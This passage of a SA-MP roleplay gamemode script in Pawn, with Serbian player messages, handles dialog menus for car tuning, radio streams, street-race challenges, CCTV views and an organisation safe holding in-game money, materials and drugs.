							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, -6, 2 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	                case 10:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_HYDRAULICS )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_HYDRAULICS;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Hydraulics" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 2, 2, 2 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	                case 11:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_NITRO )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_NITRO;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Nitro" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, -6, 2 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	            }
	        }
	        else if( !response )
			{
	            SetCameraBehindPlayer( playerid );
	            TuningTDControl( playerid, false );
	            PlayerTuningCar[ playerid ] = false;
	        }
    }
    else if(dialogid == dialog_TUNING_2 )
	{
	        if( !response ) return 1;
			if( response )
			{
			    if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
	            if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );
				new vehicleid = GetPlayerVehicleID( playerid );
			    new b1, b2;
			    if( sscanf( inputtext, "ii", b1, b2 ) ) return ShowPlayerDialog( playerid, dialog_TUNING_2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesi id boje 1 i id boje 2 boje koje zelis za svoje auto.\nFormat: 0 1", "Potvrdi", "Odustani" );
				if( b1 < 0 || b2 < 0 || b1 > 255 || b2 > 255 ) return SendErrorMessage( playerid, "ID boje ne moze biti manji od 0 ili veci od 255!");

				SMG_ChangeVehicleColor( vehicleid, b1, b2 );

				ShowPlayerDialog( playerid, dialog_TUNING, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Paintjobs\n{4282C0}(2). {FFFFFF}Colors\n{4282C0}(3). {FFFFFF}Exhausts\n{4282C0}(4). {FFFFFF}Front Bumper\n{4282C0}(5). {FFFFFF}Rear Bumper\n{4282C0}(6). {FFFFFF}Roof\n{4282C0}(7). {FFFFFF}Spoilers\n{4282C0}(8). {FFFFFF}Side Skirts\n{4282C0}(9). {FFFFFF}Wheels\n{4282C0}(10). {FFFFFF}Car Stereo\n{4282C0}(11). {FFFFFF}Hydraulics\n{4282C0}(12). {FFFFFF}Nitro", "Potvrdi", "Odustani" );
			}
	}
	else if(dialogid == dialog_VERIFIKACIJA )
	{
		if( !response ) return 1;
		if( response )
		{
		    if( PlayerCode[ playerid ] == strval( inputtext ) && !isnull( inputtext ) )
			{
				SendInfoMessage( playerid, "Vas account je verifikovan, sada mozete pokrenuti posao." );
				AccountVerified[ playerid ] = true;
		    }
		    else return SendErrorMessage( playerid, "Uneli ste pogresan kod." );
		}
	}
	else if(dialogid == dialog_CCTV )
	{
		if( !response ) return 1;
		if( response )
		{
			switch( listitem )
			{
				case 0:
				{
					SMG_SetPlayerPos( playerid, 1492.2963, -1022.7849, -100.0 );
        			SetPlayerCameraPos( playerid, 1492.2963, -1022.7849, 32.1062 );
        			SetPlayerCameraLookAt( playerid, 1491.3254, -1023.0229, 31.7661 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
				case 1:
				{
					SMG_SetPlayerPos( playerid, 1810.1304, -1234.1027, -100.0 );
        			SetPlayerCameraPos( playerid, 1810.1304, -1234.1027, 68.2777 );
        			SetPlayerCameraLookAt( playerid, 1811.1062, -1233.8708, 67.8378 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
				case 2:
				{
					SMG_SetPlayerPos( playerid, 1829.7693, -1210.4064, -100.0 );
        			SetPlayerCameraPos( playerid, 1829.7693, -1210.4064, 70.8133 );
        			SetPlayerCameraLookAt( playerid, 1829.3317, -1211.3047, 70.3782 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
				case 3:
				{
					SMG_SetPlayerPos( playerid, 1829.5350, -1238.6161, -100.0 );
        			SetPlayerCameraPos( playerid, 1829.5350, -1238.6161, 71.2610 );
        			SetPlayerCameraLookAt( playerid, 1829.1722, -1237.6848, 70.8008 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
				case 4:
				{
					SMG_SetPlayerPos( playerid, 1801.9082, -1212.8043, -100.0 );
        			SetPlayerCameraPos( playerid, 1801.9082, -1212.8043, 65.8913 );
        			SetPlayerCameraLookAt( playerid, 1801.2021, -1213.5159, 65.6614 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
			}
		}
	}
	else if(dialogid == dialog_RADIOPLAY )
	{
		if( !response ) return 1;
		if( response )
		{
		    switch( listitem )
			{
		        case 0:
				{
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "http://radio.bumbumradio.rs:8010" );
		            SendInfoMessage( playerid, "Pustili ste BUM radio." );
		        }
		        case 1:
				{
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "http://stream.b92.net:7999/radio-b92.mp3.m3u" );
		            SendInfoMessage( playerid, "Pustili ste B92 radio." );
		        }
		        case 2:
				{
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "http://94.23.38.225:7005" );
		            SendInfoMessage( playerid, "Pustili ste Antena radio." );
		        }
		        case 3:
				{
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "http://live.coolradio.rs/cool64.m3u" );
		            SendInfoMessage( playerid, "Pustili ste Cool Radio." );
		        }
		        case 4:
				{
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "http://naxi128.streaming.rs:9150" );
		            SendInfoMessage( playerid, "Pustili ste Naxi Radio." );
		        }
		        case 5:
				{
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "http://stream.rtvbn.com:8522" );
		            SendInfoMessage( playerid, "Pustili ste Radio BN." );
		        }
		        case 6:
				{
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "http://stream2.radio-banovina.hr:9996/home.html?sid=1" );
		            SendInfoMessage( playerid, "Pustili ste Radio Banovina." );
		        }
		        case 7:
				{
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "http://balkan.dj.topstream.net:8070" );
		            SendInfoMessage( playerid, "Pustili ste radio Balkan DJ." );
		        }
		        case 8:
		        {
		        	StopAudioStreamForPlayer(playerid);
		        	PlayAudioStreamForPlayer(playerid, "http://78.129.193.82:38760/");
		        	SendInfoMessage(playerid, "Pustili ste radio Ultimate.");
		        }
		        case 9:
				{
		            StopAudioStreamForPlayer( playerid );
		            SendInfoMessage( playerid, "Ugasili ste radio." );
		        }
			}
		}
	}
	else if(dialogid == dialog_IZAZOVITRKA )
	{
		if( !response ) return 1;
		if( response )
		{
		    if( PlayerInfo[ playerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Ne mozes ako nisi level 2+." );
		    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si cuffovan." );
		    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si vezan." );
			if( IsPlayerInAnyVehicle( playerid )  ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na izazov." );
			if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi otisli na izazov." );
			if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na izazov dok imate wanted.");
		    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na izazov dok ste u jailu / prisonu.");
            if( PlayerInfo[ playerid ][ xNovac ] < UlogTrke[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca za ulog." );

			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Vec si na trci." );
			if( uInterijeru[ playerid ] != Interiors[5] ) return SendErrorMessage( playerid, "Moras biti u igraonici." );

		    new igrac = PonudioIgrac[ playerid ];
    		new model = ModelTrke[ playerid ];
    		new ulog = UlogTrke[ playerid ];
    		new virtualworld = playerid;
			if( igrac == IPI ) return SendErrorMessage( playerid, "Igrac koji vas je izazvao nije na serveru." );
			if( PlayerInfo[ igrac ][ xNovac ] < ulog ) return SendErrorMessage( playerid, "Taj igrac nema dovoljno novca." );

            if( PljackaNovac[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ides na trku dok si u toku pljacke." );
    		if( PljackaNovac[ igrac ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ides na trku dok si u toku pljacke." );
    		if( PljackaZlato[ igrac ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ides na trku dok si u toku pljacke." );
            if( PljackaZlato[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ides na trku dok si u toku pljacke." );

			GetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ], PlayerPos[ playerid ][ 2 ] );
			PlayerPosInt[ playerid ] = GetPlayerInterior( playerid );
			PlayerPosVW[ playerid ] = GetPlayerVirtualWorld( playerid );

			GetPlayerPos( igrac, PlayerPos[ igrac ][ 0 ], PlayerPos[ igrac ][ 1 ], PlayerPos[ igrac ][ 2 ] );
			PlayerPosInt[ igrac ] = GetPlayerInterior( igrac );
			PlayerPosVW[ igrac ] = GetPlayerVirtualWorld( igrac );

			TrkaVozilo[ igrac ] = SMG_CreateVehicle( model, -1392.8976, -226.2226, 1042.9152, 0, random( 128 ), random( 128 ), 3600 );
			ResetVehicle( TrkaVozilo[ igrac ] );
		    SMG_SetPlayerPos( igrac, -1392.8976, -226.2226, 1042.9152 );
			PutPlayerInVehicle( igrac, TrkaVozilo[ igrac ], 0 );
		    SetVehicleVirtualWorld( TrkaVozilo[ igrac ], virtualworld );
		    LinkVehicleToInterior( TrkaVozilo[ igrac ], 7 );
		    SetPlayerVirtualWorld( igrac, virtualworld );
			SetPlayerInterior( igrac, 7 );
			vCanDrive[ TrkaVozilo[ igrac ] ] = 1;
		    PutPlayerInVehicle( igrac, TrkaVozilo[ igrac ], 0 );
			ResetVehicleStatistics( TrkaVozilo[ igrac ] );
		    SetVehicleParamsEx( TrkaVozilo[ igrac ], 1, 0, 0, 0, 0, 0, 0);
			SMG_TogglePlayerControllable( igrac, false );
			Krugovi[ igrac ] = 0; TrkaCheckpoint[ igrac ] = 0;
			TrkaIzazov[ igrac ] = 4;
			NaUtrci[ igrac ] = true;
			DajIgracuNovac( igrac, -ulog );

			TrkaVozilo[ playerid ] = SMG_CreateVehicle( model, -1398.1986, -223.7272, 1042.8796, 0, random( 128 ), random( 128 ), 3600 );
            ResetVehicle( TrkaVozilo[ playerid ] );
			SMG_SetPlayerPos( playerid, -1398.1986, -223.7272, 1042.8796 );
			PutPlayerInVehicle( playerid, TrkaVozilo[ playerid ], 0 );
		    SetVehicleVirtualWorld( TrkaVozilo[ playerid ], virtualworld );
		    LinkVehicleToInterior( TrkaVozilo[ playerid ], 7 );
		    SetPlayerVirtualWorld( playerid, virtualworld );
			SetPlayerInterior( playerid, 7 );
			vCanDrive[ TrkaVozilo[ playerid ] ] = 1;
		    PutPlayerInVehicle( playerid, TrkaVozilo[ playerid ], 0 );
			ResetVehicleStatistics( TrkaVozilo[ playerid ] );
		    SetVehicleParamsEx( TrkaVozilo[ playerid ], 1, 0, 0, 0, 0, 0, 0);
			SMG_TogglePlayerControllable( playerid, false );
			Krugovi[ playerid ] = 0; TrkaCheckpoint[ playerid ] = 0;
			TrkaIzazov[ playerid ] = 4;
			NaUtrci[ playerid ] = true;
			DajIgracuNovac( playerid, -ulog );

		   	SendClientMessage(playerid, 0x4282C0FF, "_______________________________________________________________________________");
			SendInfoMessage( igrac, "Izazvani {FFFFFF}%s {4282C0}je prihvatio vas izazov.", ImeIgraca( playerid ) );
			SendInfoMessage( playerid, "Prihvatili ste izazov od {FFFFFF}%s.", ImeIgraca( igrac ) );

			SendInfoMessage( playerid, "Ko prvi zavrsi {FFFFFF}(5) {4282C0}krugova je pobednik." );
			SendInfoMessage( igrac, "Ko prvi zavrsi {FFFFFF}(5) {4282C0}krugova je pobednik." );

			SendInfoMessage(playerid, "Ukoliko zelite izaci za utrke (/napustinsf)");
			SendInfoMessage(igrac, "Ukoliko zelite izaci za utrke (/napustinsf)");
		   	SendClientMessage(playerid, 0x4282C0FF, "_______________________________________________________________________________");

			IzazivanjeTimer[ playerid ] = SetPlayerTimerEx(playerid, "TimerIzazov", 1000, true, "i", playerid);
			IzazivanjeTimer[ igrac ] = SetPlayerTimerEx(igrac, "TimerIzazov", 1000, true, "i", igrac);
		}
		else if( !response )
		{
		    if( PonudioIgrac[ playerid ] != -1 ) SendInfoMessage( PonudioIgrac[ playerid ], "Izazvani {FFFFFF}%s {4282C0}je odbio vas izazov.", ImeIgraca( playerid ) );

			SendInfoMessage( playerid, "Odbili ste izazov od {FFFFFF}%s.", ImeIgraca( PonudioIgrac[ playerid ] ) );

			PonudioIgrac[ playerid ] = -1;
    		ModelTrke[ playerid ] = 0;
		}
	}
	else if(dialogid == dialog_ORGSAFE )
	{
		if( !response ) return 1;
		if( response )
		{
		    switch( listitem )
			{
		        case 0:
				{
		            new OrgID = PlayerInfo[ playerid ][ xClan ];

	                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	                format( globalstring, sizeof( globalstring ), "{4282C0}- Novac: {FFFFFF}($%s)\n", fNumber(org_info[OrgID][oSafeMoney]));
	               	strcat( DialogStrgEx, globalstring );

	               	format( globalstring, sizeof( globalstring ), "{4282C0}- Materijali: {FFFFFF}(%s)\n", fNumber(org_info[OrgID][oSafeMats]));
	               	strcat( DialogStrgEx, globalstring );

	                format( globalstring, sizeof( globalstring ), "{4282C0}- Droga: {FFFFFF}(%sg)\n", fNumber(org_info[OrgID][oSafeDrugAmmount]));
	               	strcat( DialogStrgEx, globalstring );

	               	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		        }
		        case 1:
				{
		            ShowPlayerDialog( playerid, dialog_ORGSAFEPUT, DIALOG_STYLE_LIST, D_NASLOV,
						"{4282C0}(1). {FFFFFF}Novac\n\
						{4282C0}(2). {FFFFFF}Materijali\n\
						{4282C0}(3). {FFFFFF}Droga", "Izaberi", "Odustani" );
		        }
		        case 2:
				{
		            if( PlayerInfo[ playerid ][ xLider ] == 0 ) return SendErrorMessage( playerid, "Ovo moze samo lider." );
		            ShowPlayerDialog( playerid, dialog_ORGSAFETAKE, DIALOG_STYLE_LIST, D_NASLOV,
						"{4282C0}(1). {FFFFFF}Novac\n\
						{4282C0}(2). {FFFFFF}Materijali\n\
						{4282C0}(3). {FFFFFF}Droga", "Izaberi", "Odustani" );
		        }
		    }
	    }
	}
	else if(dialogid == dialog_ORGSAFEPUT )
	{
	    switch( listitem )
		{
			case 0:
			{
			    ShowPlayerDialog( playerid, dialog_ORGSAFEPMONEY, DIALOG_STYLE_INPUT, D_NASLOV,  "{FFFFFF}* Unesite koliko novca zelite da ostavite.", "Potvrdi", "Odustani" );
			}
			case 1:
			{
			    ShowPlayerDialog( playerid, dialog_ORGSAFEPMATS, DIALOG_STYLE_INPUT, D_NASLOV,  "{FFFFFF}* Unesite koliko materijala zelite da ostavite.", "Potvrdi", "Odustani" );
			}
			case 2:
			{
				ShowPlayerDialog( playerid, dialog_ORGSAFEPDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za ubacivanje.", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_ORGSAFETAKE )
	{
	    switch( listitem )
		{
			case 0:
			{
			    ShowPlayerDialog( playerid, dialog_ORGSAFETMONEY, DIALOG_STYLE_INPUT, D_NASLOV,  "{FFFFFF}* Unesite koliko novca zelite da uzmete iz sefa.", "Potvrdi", "Odustani" );
			}
			case 1:
			{
			    ShowPlayerDialog( playerid, dialog_ORGSAFETMATS, DIALOG_STYLE_INPUT, D_NASLOV,  "{FFFFFF}* Unesite koliko materijala zelite da uzmete iz sefa.", "Potvrdi", "Odustani" );
			}
			case 2:
			{
			    new OrgID = PlayerInfo[ playerid ][ xClan ];
				if( org_info[ OrgID ][ oSafeDrugAmmount ] == 0 ) return SendErrorMessage( playerid, "Nemate droge u sefu.");

				ShowPlayerDialog( playerid, dialog_ORGSAFETDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za uzimanje.", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_ORGSAFEPDRUG )
	{
	    if( !response ) return 1;
		if( response )
		{
			new kolicina, OrgID = PlayerInfo[ playerid ][ xClan ];

			if( sscanf( inputtext, "d", kolicina ) )
			{
				ShowPlayerDialog( playerid, dialog_ORGSAFEPDRUG, DIALOG_STYLE_LIST, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za ubacivanje.", "Potvrdi", "Odustani" );
				return 1;
			}
	       	if( kolicina < 1 || kolicina > 5000 ) return SendErrorMessage( playerid, "Ne mozete manje od 1 i vise od 5000 odjednom.");
	       	if( PlayerInfo[playerid][xTorba_Droga] < kolicina ) return SendErrorMessage( playerid, "Nemate toliko droge u torbi.");

			if( (org_info[ OrgID ][ oSafeDrugAmmount ]+kolicina) < 1000000 )
			{
				org_info[ OrgID ][ oSafeDrugAmmount ] += kolicina;
				PlayerInfo[playerid][xTorba_Droga] -= kolicina;
				sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

				SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s ostavlja nesto u sef.", ImeIgraca( playerid ) );
				SCMF( playerid, ZUTA, "(%s): Ostavili ste {FFFFFF}(%dg) {FFFF00}droge u sef.", org_info[ OrgID ][ oPreFix ], kolicina );

				new q[200];
				format(q, sizeof(q), "(DILER - [%d])\nCena: {FFFFFF}$%d\n{64BC47}Dostupno: {FFFFFF}%dg\n{64BC47}Dostupan: {FFFFFF}%s", OrgID, org_info[ OrgID ][ oDilerCena ], org_info[ OrgID ][ oSafeDrugAmmount ], ((org_info[OrgID][oDilerRadi]) ? ("Da") : ("Ne")) );
				UpdateDynamic3DTextLabelText(org_info[OrgID][oDiler3D], 0x64BC47FF, q);

				sql_organization_update_drugs( OrgID );
			}
			else SendErrorMessage( playerid, "Nemate mesta gde da stavite drogu." );
		}
	}
	else if(dialogid == dialog_ORGSAFETDRUG )
	{
	    if( !response ) return 1;
		if( response )
		{
			new kolicina, OrgID = PlayerInfo[ playerid ][ xClan ];

			if( sscanf( inputtext, "d", kolicina ) )
			{
				ShowPlayerDialog( playerid, dialog_ORGSAFETDRUG, DIALOG_STYLE_LIST, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za uzimanje.", "Potvrdi", "Odustani" );
				return 1;
			}

			if( org_info[ OrgID ][ oSafeDrugAmmount ] == 0 ) return SendErrorMessage( playerid, "Ovaj sef nema drogu!");
	       	if( kolicina < 1 || kolicina > org_info[ OrgID ][ oSafeDrugAmmount ] ) return SendErrorMessage( playerid, "Ovaj sef nema toliko droge!");

			if( (PlayerInfo[playerid][xTorba_Droga]+kolicina) < 100000 )
			{
				org_info[ OrgID ][ oSafeDrugAmmount ] -= kolicina;
				PlayerInfo[playerid][xTorba_Droga] += kolicina;
				sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

				SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s uzima nesto iz sefa.", ImeIgraca( playerid ) );
				SCMF( playerid, ZUTA, "(%s): Uzeli ste {FFFFFF}(%dg) {FFFF00}droge iz sefa.", org_info[ OrgID ][ oPreFix ], kolicina );

				new q[200];
				format(q, sizeof(q), "(DILER - [%d])\nCena: {FFFFFF}$%d\n{64BC47}Dostupno: {FFFFFF}%dg\n{64BC47}Dostupan: {FFFFFF}%s", OrgID, org_info[ OrgID ][ oDilerCena ], org_info[ OrgID ][ oSafeDrugAmmount ], ((org_info[OrgID][oDilerRadi]) ? ("Da") : ("Ne")) );
				UpdateDynamic3DTextLabelText(org_info[OrgID][oDiler3D], 0x64BC47FF, q);

				sql_organization_update_drugs( OrgID );
			}
			else SendErrorMessage( playerid, "Nemate mesta gde da stavite drogu." );
		}
	}
	else if(dialogid == dialog_ORGSAFEPMONEY )
	{
		if( !response ) return 1;
		if( response )
		{
		    new novac, OrgID = PlayerInfo[ playerid ][ xClan ];

            if( sscanf( inputtext, "i", novac ) ) return ShowPlayerDialog( playerid, dialog_ORGSAFEPMONEY, DIALOG_STYLE_INPUT, D_NASLOV,  "Unesite koliko novca zelite da ostavite.", "Potvrdi", "Odustani" );
            if( novac < 1 || novac > 100000 ) return ShowPlayerDialog( playerid, dialog_ORGSAFEPMONEY, DIALOG_STYLE_INPUT, D_NASLOV,  "GRESKA: Ne moze ispod 1 ili iznad 100000\nUnesite koliko novca zelite da ostavite.", "Potvrdi", "Odustani" );
			if( novac > PlayerInfo[ playerid ][ xNovac ] ) return ShowPlayerDialog( playerid, dialog_ORGSAFEPMONEY, DIALOG_STYLE_INPUT, D_NASLOV,  "GRESKA: Nemate toliko novca kod sebe\nUnesite koliko novca zelite da ostavite.", "Potvrdi", "Odustani" );

			DajIgracuNovac( playerid, -novac );
            org_info[ OrgID ][ oSafeMoney ] += novac;
			sql_organization_update_integer( OrgID, "safe_money", org_info[ OrgID ][ oSafeMoney ] );

		    SCMF( playerid, ZUTA, "(%s): Ostavili ste {FFFFFF}($%d) {FFFF00}u sef.", org_info[ OrgID ][ oPreFix ], novac );
		}
	}
	else if(dialogid == dialog_ORGSAFETMONEY )
	{
		if( !response ) return 1;
		if( response )
		{
		    new novac, OrgID = PlayerInfo[ playerid ][ xClan ];

            if( sscanf( inputtext, "i", novac ) ) return ShowPlayerDialog( playerid, dialog_ORGSAFETMONEY, DIALOG_STYLE_INPUT, D_NASLOV,  "Unesite koliko novca zelite da uzmete iz sefa.", "Potvrdi", "Odustani" );
            if( novac < 1 || novac > 100000 ) return ShowPlayerDialog( playerid, dialog_ORGSAFETMONEY, DIALOG_STYLE_INPUT, D_NASLOV,  "GRESKA: Ne moze ispod 1 ili iznad 100000\nUnesite koliko novca zelite da uzmete iz sefa.", "Potvrdi", "Odustani" );
			if( novac > org_info[ OrgID ][ oSafeMoney ] ) return ShowPlayerDialog( playerid, dialog_ORGSAFETMONEY, DIALOG_STYLE_INPUT, D_NASLOV,  "GRESKA: Nema toliko novca u sefu\nUnesite koliko novca zelite da uzmete iz sefa.", "Potvrdi", "Odustani" );

			DajIgracuNovac( playerid, novac );
            org_info[ OrgID ][ oSafeMoney ] -= novac;
			sql_organization_update_integer( OrgID, "safe_money", org_info[ OrgID ][ oSafeMoney ] );

		    SCMF( playerid, ZUTA, "(%s): Uzeli ste {FFFFFF}($%d) {FFFF00}iz sefa.", org_info[ OrgID ][ oPreFix ], novac );
		}
	}
	//
	else if(dialogid == dialog_ORGSAFEPMATS )
 	{
		if( !response ) return 1;
		if( response )
		{
		    new matss, OrgID = PlayerInfo[ playerid ][ xClan ];
            if( sscanf( inputtext, "i", matss ) ) return ShowPlayerDialog( playerid, dialog_ORGSAFEPMATS, DIALOG_STYLE_INPUT, D_NASLOV,  "Unesite koliko materijala zelite da ostavite.", "Potvrdi", "Odustani" );
            if( matss < 1 || matss > 100000 ) return ShowPlayerDialog( playerid, dialog_ORGSAFEPMATS, DIALOG_STYLE_INPUT, D_NASLOV,  "GRESKA: Ne moze ispod 1 ili iznad 10000\nUnesite koliko materijala zelite da ostavite.", "Potvrdi", "Odustani" );
			if( matss > PlayerInfo[ playerid ][ xMaterijali ] ) return ShowPlayerDialog( playerid, dialog_ORGSAFEPMATS, DIALOG_STYLE_INPUT, D_NASLOV,  "GRESKA: Nemate toliko materijala kod sebe\nUnesite koliko materijala zelite da ostavite.", "Potvrdi", "Odustani" );

            PlayerInfo[ playerid ][ xMaterijali ] -= matss;
            org_info[ OrgID ][ oSafeMats ] += matss;
			sql_organization_update_integer( OrgID, "safe_mats", org_info[ OrgID ][ oSafeMats ] );
			sql_user_update_integer( playerid, "materials", PlayerInfo[ playerid ][ xMaterijali ] );

		    SCMF( playerid, ZUTA, "(%s): Ostavili ste {FFFFFF}(%d) {FFFF00}materijala u sef.", org_info[ OrgID ][ oPreFix ], matss );
		}
	}
	else if(dialogid == dialog_ORGSAFETMATS )
	{
		if( !response ) return 1;
		if( response )
		{
		    new matss, OrgID = PlayerInfo[ playerid ][ xClan ];
            if( sscanf( inputtext, "i", matss ) ) return ShowPlayerDialog( playerid, dialog_ORGSAFETMATS, DIALOG_STYLE_INPUT, D_NASLOV,  "Unesite koliko materijala zelite da uzmete iz sefa.", "Potvrdi", "Odustani" );
            if( matss < 1 || matss > 100000 ) return ShowPlayerDialog( playerid, dialog_ORGSAFETMATS, DIALOG_STYLE_INPUT, D_NASLOV,  "GRESKA: Ne moze ispod 1 ili iznad 100000\nUnesite koliko materijala zelite da uzmete iz sefa.", "Potvrdi", "Odustani" );
